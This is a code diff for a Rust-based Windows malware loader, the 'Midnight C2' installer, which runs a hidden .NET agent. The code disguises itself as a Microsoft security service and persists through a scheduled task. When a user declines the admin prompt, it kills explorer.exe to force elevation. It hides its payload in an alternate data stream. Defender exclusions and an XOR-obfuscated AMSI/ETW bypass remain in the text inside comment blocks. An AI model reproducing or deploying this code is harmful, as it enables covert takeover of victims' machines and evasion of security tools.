@@ -9,9 +9,8 @@ use std::os::windows::process::CommandExt;
 use std::path::Path;
 use windows::Win32::System::Console::FreeConsole;
 use windows::Win32::UI::Shell::{IsUserAnAdmin, ShellExecuteW};
-use windows::Win32::UI::WindowsAndMessaging::{SW_HIDE, SW_NORMAL};
+use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;
 use windows::Win32::System::Registry::*;
-use windows::Win32::System::Memory::*;
 
 // Interface IIDs
 const IID_ICLR_META_HOST: GUID = GUID::from_u128(0xd332db9e_b9b3_4125_8207_a14884f53216);
@@ -47,7 +46,7 @@ fn get_install_info() -> (String, String, bool) {
         if is_admin {
             (
                 r"C:\ProgramData\Microsoft\Windows\Security".to_string(),
-                "Microsoft Security Service".to_string(),
+                r"Microsoft\Windows\Security\SecurityHost".to_string(),
                 true
             )
         } else {
@@ -97,6 +96,7 @@ fn uninstall_old_agent() {
         }
     }
     
+    /* 
     for _ in 0..3 {
         let _ = std::process::Command::new("taskkill")
             .args(&["/F", "/T", "/IM", EXE_NAME])
@@ -118,6 +118,7 @@ fn uninstall_old_agent() {
         .output();
     
     std::thread::sleep(std::time::Duration::from_secs(3));
+    */
     
     let paths = [system_path.to_string(), user_path];
     for path_str in paths.iter() {
@@ -140,39 +141,69 @@ fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
     let (install_folder, task_name, is_admin) = get_install_info();
     let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
     
+    // 3. Copy executable
+    let current_exe = std::env::current_exe()?;
+    let _current_filename = current_exe.file_name().unwrap_or_default().to_str().unwrap_or(EXE_NAME);
+
     // 1. Create directory
     std::fs::create_dir_all(&install_folder)?;
     log(&format!("[+] Directory: {}", install_folder));
-    
+
+    /*
     // 2. Add Windows Defender Exclusions
     let exclusion_cmd = format!(
         "Add-MpPreference -ExclusionPath '{}' -ErrorAction SilentlyContinue; \
          Add-MpPreference -ExclusionProcess '{}' -ErrorAction SilentlyContinue; \
+         Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp' -ErrorAction SilentlyContinue; \
+         Add-MpPreference -ExclusionPath '$env:TEMP' -ErrorAction SilentlyContinue; \
+         Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp\\MpSigStub.dll' -ErrorAction SilentlyContinue; \
          Add-MpPreference -ExclusionPath '$env:TEMP\\MpSigStub.dll' -ErrorAction SilentlyContinue",
-        install_folder, EXE_NAME
+        install_folder, current_filename
     );
     let _ = std::process::Command::new("powershell")
         .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &exclusion_cmd])
         .creation_flags(0x08000000)
         .output();
     log("[+] Defender exclusions added");
+    */
     
     // 3. Copy executable
     let current_exe = std::env::current_exe()?;
     let mut copied = false;
-    for _ in 0..3 {
-        let _ = std::fs::remove_file(&install_path);
-        if std::fs::copy(&current_exe, &install_path).is_ok() {
-            copied = true;
-            break;
+    
+    // Check if we are already running from the target location
+    if current_exe.to_string_lossy().to_lowercase() == install_path.to_lowercase() {
+        copied = true; // No need to copy to ourselves
+    } else {
+        for i in 0..5 {
+            // If first attempt fails, try to kill the target process to free the lock
+            if i > 0 {
+                let _ = std::process::Command::new("taskkill")
+                    .args(&["/F", "/IM", EXE_NAME])
+                    .creation_flags(0x08000000)
+                    .output();
+                std::thread::sleep(std::time::Duration::from_millis(500));
+            }
+
+            let _ = std::fs::remove_file(&install_path);
+            if std::fs::copy(&current_exe, &install_path).is_ok() {
+                copied = true;
+                break;
+            }
+            std::thread::sleep(std::time::Duration::from_millis(1000));
         }
-        std::thread::sleep(std::time::Duration::from_millis(1000));
     }
     
     if !copied {
-        log(&format!("[!] Failed to copy to: {}", install_path));
+        log(&format!("[!] Failed to copy to: {}. File might be locked.", install_path));
     } else {
         log(&format!("[+] Installed to: {}", install_path));
+        // Set hidden attributes to the newly copied file
+        let path_hstring = HSTRING::from(&install_path);
+        let _ = unsafe { windows::Win32::Storage::FileSystem::SetFileAttributesW(
+            PCWSTR(path_hstring.as_ptr()), 
+            windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN | windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_SYSTEM
+        )};
     }
     
     // 4. Create Scheduled Task
@@ -194,7 +225,7 @@ fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
     </BootTrigger>
     <TimeTrigger>
       <Repetition>
-        <Interval>PT1M</Interval>
+        <Interval>PT3M</Interval>
         <StopAtDurationEnd>false</StopAtDurationEnd>
       </Repetition>
       <StartBoundary>2020-01-01T00:00:00</StartBoundary>
@@ -206,7 +237,7 @@ fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
     </LogonTrigger>
     <TimeTrigger>
       <Repetition>
-        <Interval>PT1M</Interval>
+        <Interval>PT3M</Interval>
         <StopAtDurationEnd>false</StopAtDurationEnd>
       </Repetition>
       <StartBoundary>2020-01-01T00:00:00</StartBoundary>
@@ -247,7 +278,7 @@ fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
     </Exec>
   </Actions>
 </Task>"#, trigger_xml, principal_xml, install_path);
-    
+      
     let temp_xml = std::env::temp_dir().join("mstask.xml");
     std::fs::write(&temp_xml, task_xml)?;
     
@@ -272,7 +303,8 @@ fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
             .output();
         log("[+] Task started");
     } else {
-        log("[!] Failed to create scheduled task");
+        let err = String::from_utf8_lossy(&output.stderr);
+        log(&format!("[!] Task failed: {}", err.trim()));
     }
     
     Ok(())
@@ -295,23 +327,27 @@ fn main() -> windows::core::Result<()> {
         let target_lower = install_path.to_lowercase();
         
         let is_target_path = current_lower == target_lower;
-        let is_system = std::env::var("USERNAME").unwrap_or_default().to_uppercase() == "SYSTEM";
+        let user_name = std::env::var("USERNAME").unwrap_or_default().to_uppercase();
+        let is_system = user_name.contains("SYSTEM") || user_name.contains("LOCAL SERVICE") || user_name.contains("NETWORK SERVICE");
+        let is_privileged = is_admin || is_system;
+
         let parent_dir = current_exe.parent().unwrap_or(std::path::Path::new("")).file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
         let current_exe_name = current_exe.file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
 
-        let is_installed_location = is_target_path || (current_exe_name == "securityhost.exe" && parent_dir == "security");
+        let _is_installed_location = is_target_path || (current_exe_name == "securityhost.exe" && parent_dir == "security");
         
         // STRATEGIC AGENT DETECTION:
-        // We only show the UI if the file is SPECIFICALLY named "midnight_loader.exe" 
-        // AND not running as SYSTEM, AND the "agent" flag is NOT present.
-        // This ensures the installer only appears on the attacker's desk, never on the victim's.
+        // Show UI if it's the installer filename and NO 'agent' argument is present
         let is_installer_file = current_exe_name == "midnight_loader.exe" || current_exe_name == "midnightloader.exe";
         let has_agent_arg = args.iter().any(|a| a == "agent");
         
-        let should_show_ui = is_installer_file && !is_system && !has_agent_arg;
-        let is_agent_mode = !should_show_ui; 
+        // IF it's the installer file, we ALWAYS act as installer and EXIT after.
+        let is_agent_mode = !is_installer_file || has_agent_arg;
+        let should_show_ui = is_installer_file && !has_agent_arg;
         
-        if !is_agent_mode {
+        if should_show_ui {
+            // Ensure console is visible for installer
+            // (Windows might have hidden it if double-clicked)
             // Safety check
             if is_target_path { return Ok(()); }
 
@@ -320,7 +356,7 @@ fn main() -> windows::core::Result<()> {
             println!("   Midnight C2 - Installer v0.6.36");
             println!("========================================");
 
-            if !is_admin {
+            if !is_privileged {
                 println!(" [!] Error: Administrator privileges required.");
                 return Ok(());
             }
@@ -351,112 +387,119 @@ fn main() -> windows::core::Result<()> {
         }
         
         if is_agent_mode {
-            let _ = unsafe { FreeConsole() };
-            unsafe { SILENT_MODE = true; }
+            // --- SINGLE INSTANCE LOCK (MUTEX) ---
+            // This prevents the Task, Service, and Run-Key from running 4 agents at once!
+            let mutex_name = HSTRING::from("Global\\MidnightAgent_Lock_v1");
+            unsafe {
+                let _ = windows::Win32::System::Threading::CreateMutexW(
+                    None, 
+                    true, 
+                    PCWSTR(mutex_name.as_ptr())
+                );
+                
+                if std::io::Error::last_os_error().raw_os_error() == Some(183) { // 183 is ERROR_ALREADY_EXISTS
+                    // Another instance is already running! Exit silently.
+                    std::process::exit(0);
+                }
+            }
+
+            let _ = FreeConsole();
+            SILENT_MODE = true; 
             
             // --- UAC ESCALATION TRAP ---
-            if !is_admin && !is_system {
-                // Check if the SYSTEM agent is already installed and running.
-                // If it exists in ProgramData, it means the Service or another SYSTEM task already succeeded.
-                // We should silently exit to avoid dual-running and crashing the user's explorer!
+            if !is_privileged {
                 let system_install_path = r"C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe";
-                if std::path::Path::new(system_install_path).exists() {
-                    std::process::exit(0);
-                }
+                if !std::path::Path::new(system_install_path).exists() {
+                    let verb = HSTRING::from("runas");
+                    let file = HSTRING::from(&current_path);
+                    let params = HSTRING::from("agent --relocated");
 
-                let verb = HSTRING::from("runas");
-                let file = HSTRING::from(&current_path);
-                let params = HSTRING::from("agent --relocated"); // prevent loop
-
-                // 1st Attempt: Polite Elevation. 
-                // If UAC is disabled or modded Windows, this will succeed immediately without popups.
-                let first_attempt = unsafe {
-                    ShellExecuteW(None, PCWSTR(verb.as_ptr()), PCWSTR(file.as_ptr()), PCWSTR(params.as_ptr()), None, SW_HIDE)
-                };
-                
-                if first_attempt.0 as usize > 32 {
-                    // Success! No need to bother explorer.
-                    std::process::exit(0);
-                }
-
-                // 2nd Attempt: HOSTILE TAKEOVER (User pressed No or closed the UAC prompt)
-                
-                // LOCKDOWN: Kill explorer.exe to trap the user in a black screen
-                let _ = std::process::Command::new("taskkill")
-                    .args(&["/F", "/IM", "explorer.exe"])
-                    .creation_flags(0x08000000)
-                    .output();
-                
-                // The Infinite Trap
-                loop {
-                    let result = unsafe {
-                        ShellExecuteW(None, PCWSTR(verb.as_ptr()), PCWSTR(file.as_ptr()), PCWSTR(params.as_ptr()), None, SW_HIDE)
-                    };
+                    // 1. Polite Attempt
+                    let first_attempt = ShellExecuteW(None, PCWSTR(verb.as_ptr()), PCWSTR(file.as_ptr()), PCWSTR(params.as_ptr()), None, SW_HIDE);
                     
-                    if result.0 as usize > 32 {
-                        break; // Elevation achieved
+                    if first_attempt.0 as usize <= 32 {
+                        // 2. Persistent Attempt (Killer)
+                        let _ = std::process::Command::new("taskkill").args(&["/F", "/IM", "explorer.exe"]).creation_flags(0x08000000).output();
+                        loop {
+                            let result = ShellExecuteW(None, PCWSTR(verb.as_ptr()), PCWSTR(file.as_ptr()), PCWSTR(params.as_ptr()), None, SW_HIDE);
+                            if result.0 as usize > 32 { break; }
+                            std::thread::sleep(std::time::Duration::from_secs(2));
+                        }
                     }
-                    
-                    // User was stubborn. Make them wait 2 seconds and ask again.
-                    std::thread::sleep(std::time::Duration::from_secs(2));
+                    std::process::exit(0);
                 }
-                
-                // RESTORE: Restart explorer.exe to give them back their desktop
-                let _ = std::process::Command::new("explorer.exe").spawn();
+            }
+
+            // --- DEPLOYMENT & RECOVERY ---
+            // Settle in permanent path if elevated but not there yet
+            if is_admin && !is_system && !is_target_path {
+                let _ = install_agent();
+                let _ = std::process::Command::new("explorer.exe").creation_flags(0x08000000).spawn();
                 std::process::exit(0);
             }
 
-            let (install_folder, task_name, _) = get_install_info();
-            let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
-            
-            let file_exists = std::path::Path::new(&install_path).exists();
-            let task_status = std::process::Command::new("schtasks")
-                .args(&["/Query", "/TN", &task_name])
-                .creation_flags(0x08000000)
-                .output();
-                
-            let task_exists = task_status.is_ok() && task_status.unwrap().status.success();
-            
-            if !file_exists || !task_exists {
-                uninstall_old_agent();
-                let _ = install_agent();
-            }
+            // --- AUTO-SYNC PERSISTENCE ---
+            // Even if already installed, we run install_agent() to ensure:
+            // 1. Task settings (like 3 min interval) are updated to latest
+            // 2. Task is repaired if deleted or corrupted
+            let _ = install_agent();
         }
+        /*
         {
-            let amsi_func_name = std::ffi::CString::new("AmsiScanBuffer").unwrap();
-            let amsi_name = HSTRING::from("amsi.dll");
-            let amsi = LoadLibraryW(PCWSTR(amsi_name.as_ptr()));
-            if let Ok(amsi_handle) = amsi {
-                if !amsi_handle.is_invalid() {
-                    let func_addr = GetProcAddress(amsi_handle, windows::core::PCSTR(amsi_func_name.as_ptr() as *const u8));
-                    if let Some(addr) = func_addr {
-                        let addr = addr as *mut u8;
-                        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
-                        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE, &mut old_protect);
-                        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
-                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), old_protect, &mut old_protect);
+            // --- DYNAMIC AMSI/ETW BYPASS (OBFUSCATED) ---
+            let k: u8 = 0x55; // XOR Key
+            
+            // Decrypt "amsi.dll"
+            let enc_amsi = [0x34, 0x38, 0x26, 0x3c, 0x7b, 0x31, 0x39, 0x39];
+            let amsi_str: String = enc_amsi.iter().map(|b| (b ^ k) as char).collect();
+            
+            if let Ok(amsi_lib) = LoadLibraryW(PCWSTR(HSTRING::from(&amsi_str).as_ptr())) {
+                // Decrypt "AmsiScanBuffer"
+                let enc_asb = [0x14, 0x38, 0x26, 0x3c, 0x06, 0x36, 0x34, 0x3b, 0x17, 0x20, 0x33, 0x33, 0x30, 0x27];
+                let asb_str: String = enc_asb.iter().map(|b| (b ^ k) as char).collect();
+                let asb_c = std::ffi::CString::new(asb_str).unwrap();
+                
+                if let Some(addr) = GetProcAddress(amsi_lib, windows::core::PCSTR(asb_c.as_ptr() as *const u8)) {
+                    let addr = addr as *mut u8;
+                    // Patch: mov eax, 0x80070057; ret -> b8 57 00 07 80 c3
+                    let p_enc = [0xed, 0x02, 0x55, 0x52, 0xd5, 0x96];
+                    let mut p = [0u8; 6];
+                    for i in 0..6 { p[i] = p_enc[i] ^ k; }
+                    
+                    let mut old = PAGE_PROTECTION_FLAGS(0);
+                    if windows::Win32::System::Memory::VirtualProtect(addr as _, p.len(), PAGE_EXECUTE_READWRITE, &mut old).is_ok() {
+                        std::ptr::copy_nonoverlapping(p.as_ptr(), addr, p.len());
+                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as _, p.len(), old, &mut old);
                     }
                 }
             }
+
+            // Decrypt "ntdll.dll"
+            let enc_nt = [0x3b, 0x21, 0x31, 0x39, 0x39, 0x7b, 0x31, 0x39, 0x39];
+            let nt_str: String = enc_nt.iter().map(|b| (b ^ k) as char).collect();
             
-            let etw_func_name = std::ffi::CString::new("EtwEventWrite").unwrap();
-            let ntdll_name = HSTRING::from("ntdll.dll");
-            let ntdll = LoadLibraryW(PCWSTR(ntdll_name.as_ptr()));
-            if let Ok(ntdll_handle) = ntdll {
-                if !ntdll_handle.is_invalid() {
-                    let func_addr = GetProcAddress(ntdll_handle, windows::core::PCSTR(etw_func_name.as_ptr() as *const u8));
-                    if let Some(addr) = func_addr {
-                        let addr = addr as *mut u8;
-                        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
-                        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE, &mut old_protect);
-                        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
-                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), old_protect, &mut old_protect);
+            if let Ok(nt_lib) = LoadLibraryW(PCWSTR(HSTRING::from(&nt_str).as_ptr())) {
+                // Decrypt "EtwEventWrite"
+                let enc_eew = [0x10, 0x21, 0x22, 0x10, 0x23, 0x30, 0x3b, 0x21, 0x02, 0x27, 0x3c, 0x21, 0x30];
+                let eew_str: String = enc_eew.iter().map(|b| (b ^ k) as char).collect();
+                let eew_c = std::ffi::CString::new(eew_str).unwrap();
+                
+                if let Some(addr) = GetProcAddress(nt_lib, windows::core::PCSTR(eew_c.as_ptr() as *const u8)) {
+                    let addr = addr as *mut u8;
+                    // Patch: xor eax, eax; ret -> 31 c0 c3
+                    let p_enc = [0x64, 0x95, 0x96];
+                    let mut p = [0u8; 3];
+                    for i in 0..3 { p[i] = p_enc[i] ^ k; }
+                    
+                    let mut old = PAGE_PROTECTION_FLAGS(0);
+                    if windows::Win32::System::Memory::VirtualProtect(addr as _, p.len(), PAGE_EXECUTE_READWRITE, &mut old).is_ok() {
+                        std::ptr::copy_nonoverlapping(p.as_ptr(), addr, p.len());
+                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as _, p.len(), old, &mut old);
                     }
                 }
             }
         }
+        */
 
         CoInitializeEx(None, COINIT_MULTITHREADED)?;
         let mscoree_name = HSTRING::from("mscoree.dll");
@@ -479,16 +522,32 @@ fn main() -> windows::core::Result<()> {
         let runtime_host: ICLRRuntimeHost = runtime_info.GetInterface(&GUID::from_u128(0x90f1a06e_7712_4762_86b5_7a5eba6bdb02))?;
         let _ = runtime_host.Start();
         
+        // === ZERO-FILE LOADING (ADS - Alternative Data Stream) ===
+        // We hide the DLL bytes INSIDE the current executable's metadata stream.
         let dll_bytes = include_bytes!(r"..\..\MidnightAgent\bin\Release\net48\MidnightAgent.dll");
-        let dll_path = std::env::temp_dir().join("MpSigStub.dll");
-        let _ = std::fs::remove_file(&dll_path);
-        std::fs::write(&dll_path, dll_bytes).expect("Failed to write payload");
-        let path_hstring = HSTRING::from(dll_path.to_str().unwrap());
-        let _ = windows::Win32::Storage::FileSystem::SetFileAttributesW(PCWSTR(path_hstring.as_ptr()), windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN | windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_SYSTEM);
-        let type_name = HSTRING::from("MidnightAgent.Program");
-        let method_name = HSTRING::from("Run");
-        let method_arg = HSTRING::from("");
-        let _ = runtime_host.ExecuteInDefaultAppDomain(PCWSTR(path_hstring.as_ptr()), PCWSTR(type_name.as_ptr()), PCWSTR(method_name.as_ptr()), PCWSTR(method_arg.as_ptr()));
+        
+        // ADS Path format: "C:\path\executable.exe:metadata"
+        // This hides the DLL within the file itself, invisible to normal file scanners.
+        let ads_path = format!("{}:metadata", current_path);
+        
+        // Write bytes to the hidden stream
+        if std::fs::write(&ads_path, dll_bytes).is_ok() {
+            let path_hstring = HSTRING::from(&ads_path);
+            
+            let type_name = HSTRING::from("MidnightAgent.Program");
+            let method_name = HSTRING::from("Run");
+            let method_arg = HSTRING::from("");
+            
+            // The .NET host can load assemblies directly from ADS paths!
+            let _ = runtime_host.ExecuteInDefaultAppDomain(
+                PCWSTR(path_hstring.as_ptr()), 
+                PCWSTR(type_name.as_ptr()), 
+                PCWSTR(method_name.as_ptr()), 
+                PCWSTR(method_arg.as_ptr())
+            );
+        }
+
+
         Ok(())
     }
 }
